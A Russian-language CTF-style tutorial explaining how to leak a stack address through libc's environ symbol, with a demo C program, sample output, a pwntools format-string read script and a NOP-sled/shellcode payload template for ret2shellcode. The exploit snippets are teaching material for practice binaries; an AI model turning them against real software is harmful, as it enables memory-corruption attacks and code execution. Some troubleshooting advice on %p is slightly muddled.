## Вопрос, с которого всё начинается

В задачах с format string мы утекаем адреса через `%p`, вычисляем базу libc и пишем по нужным адресам через `%n`. Но что, если цель находится **на стеке** — например, сохранённый адрес возврата или наш буфер с shellcode? Нужен адрес стека. Оказывается, сама libc хранит указатель на стек в символе `environ`. Сегодня разберём, как им пользоваться.

## Наш пример: читаем environ

Возьмём программу, которая печатает адрес переменной `environ` и её значение:

```c
#include "common.h"
extern char **environ;                 /* переменная из libc */
int main(void){
    printf("&environ (адрес переменной) = %p\n", (void*)&environ);
    printf("environ  (значение)         = %p   <- это адрес стека\n", (void*)environ);
    printf("первая переменная: %s\n", environ[0]);
    char *a = malloc(0x20);
    printf("heap-указатель = %p  (далеко от стека)\n", a);
    return 0;
}
```

`environ` — это указатель на массив переменных окружения. Каждая переменная — строка вида `KEY=VALUE`. Ядро и загрузчик размещают этот массив **на стеке** при старте процесса.

## Шаг 1. Смотрим реальный вывод

Компилируем и запускаем:

```
$ gcc -fno-pie -no-pie -O0 -o environ environ.c
$ ./environ
== утечка стека через environ ==
&environ (в libc) = 0x404028
environ (значение) = 0x7ffd886da9a8   <- это адрес стека
первая переменная: SHELL=/usr/bin/bash
heap-указатель = 0x1c94f020  (далеко от стека)
```

Читаем:

- `&environ = 0x404028` — адрес самой переменной. В `-no-pie` бинаре она попадает в `.bss` через так называемую copy-релокацию (линкер копирует её из libc в исполняемый файл). В PIE-бинаре вы возьмёте её как `libc.address + libc.symbols['environ']`.
- `environ = 0x7ffd886da9a8` — **значение** переменной. Это адрес в диапазоне `0x7ff…`, то есть на **стеке**. Именно он нам и нужен.
- `heap-указатель = 0x1c94f020` — куча лежит совсем в другом регионе. Это подтверждает, что `environ` указывает именно на стек.

## Шаг 2. ASLR и стабильность

Запустим программу несколько раз:

```
$ for i in 1 2 3; do ./environ | grep значение; done
environ (значение) = 0x7ffc9a206598   <- это адрес стека
environ (значение) = 0x7ffdb41f1d88   <- это адрес стека
environ (значение) = 0x7fff90ea1038   <- это адрес стека
```

Значение меняется — работает ASLR. Но важный момент: **в рамках одного запуска (одного соединения) адрес стабилен**. Эксплойт читает `environ` один раз и использует полученное значение для всех дальнейших вычислений. После переподключения его нужно утекать заново.

## Шаг 3. Зачем нужен адрес стека

Адрес стека нужен в нескольких сценариях:

1. **Возврат к shellcode на стеке** (если стек исполняем, NX off): вычисляем адрес буфера и прыгаем туда.
2. **Перезапись сохранённого адреса возврата** в известной точке стека.
3. **Обход ASLR стека** при частичной перезаписи.
4. **Чтение секретов** из аргументов или переменных окружения (флаг, токены).
5. **Эксплуатация format string**, где через `%n` нужно писать по адресу на стеке.

Родственный символ — `__libc_argv`. Он указывает на массив аргументов командной строки (`argv`), который тоже лежит на стеке, рядом с `environ`. Если по какой-то причине `environ` недоступен или обрывается нулями, `__libc_argv` даёт тот же стековый адрес. Полезно помнить общую раскладку стека при старте процесса: сверху вниз идут `argc`, массив указателей `argv` (завершается `NULL`), массив указателей `envp` (тоже `NULL`), затем `auxv` (вспомогательный вектор) и, наконец, сами строки аргументов и окружения. Ниже расположены кадры `__libc_start_main` и `main`. Знание этой раскладки позволяет от утечки `environ` двигаться к `argv` или к сохранённому адресу возврата `main` на фиксированное расстояние.

## Шаг 4. Чтение environ через format string

Пусть у нас format string, и мы знаем базу libc (утекли через `%p`). Тогда адрес переменной `environ` известен, а её значение (адрес стека) читается так:

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

p = process('./chall')
p.sendline(b'%11$p')                       # утечка libc-адреса
libc.address = int(p.recvline(), 16) - 0x29d90
environ = libc.address + libc.symbols['environ']

off = 6                                    # позиция, где лежит наш буфер
p.sendline(p64(environ) + b'%' + str(off).encode() + b'$s')
leak = p.recvuntil(b'\n')[:-1]
stack = u64(leak.ljust(8, b'\x00'))
log.success('stack @ %#x', stack)
```

Здесь `%off$s` печатает строку по адресу, который лежит в аргументе номер `off`. Мы положили в начало буфера адрес `environ`, поэтому `%off$s` читает 8 байт, на которые указывает `environ` (то есть сам указатель на стек), и печатает их как строку.

## Шаг 5. Вычисление нужного адреса

Пусть стек исполняем и есть переполнение, но ASLR включён. Мы прочитали `environ` и получили `stack`. Наш буфер лежит на фиксированном расстоянии `delta` от `environ` (его определяют локально в gdb: разница между `&buf` и значением `environ`). Тогда адрес буфера:

```python
buf_addr = stack - delta
payload  = b'\x90' * nop_count + shellcode
payload += b'A' * (offset - nop_count - len(shellcode))
payload += p64(buf_addr)
```

`delta` зависит от окружения и аргументов, поэтому в удалённых задачах его либо фиксируют (минимальное окружение), либо подбирают по младшим байтам.

## Если не сработало

- **`environ` не в libc.** В некоторых сборках символ называется `__environ`; проверьте `nm -D libc.so.6 | grep environ`.
- **Нулевые байты обрывают `%s`.** Указатель на стек содержит нули в старших байтах, и `%s` остановится. Читайте побайтово или используйте `%N$p` (позиционный указатель печатает полные 8 байт).
- **Неверная база libc.** Тогда `environ` укажет в мусор, и `%s` вернёт пусто или упадёт.
- **`delta` нестабильна.** Расстояние до буфера зависит от окружения.
- **Архитектура.** На 32-бит `environ` — 4-байтовый указатель, читайте `u32`.

## Что мы теперь знаем

- `environ` — указатель на массив переменных окружения, размещённый на стеке.
- Значение `environ` — это адрес стека; его читают через `%s` или arbitrary read.
- В `-no-pie` переменная лежит в `.bss` (copy-релокация); в PIE — в libc.
- Адрес стека нужен для ret2shellcode, перезаписи ret и format string.
- `delta` (расстояние до буфера) определяют локально и подбирают в удалённых задачах.
- В рамках одного соединения адрес стабилен, между запусками — меняется.

## На что смотреть дальше

- **Имя символа.** `environ` vs `__environ`.
- **Нулевые байты.** `%s` обрывается — читайте побайтово.
- **`delta`.** Определите в gdb для вашего бинаря.
- **Архитектура.** 4 байта на 32-бит, 8 на 64.
- **Отладка.** `p &environ`, `p environ`, `x/8gx environ`.
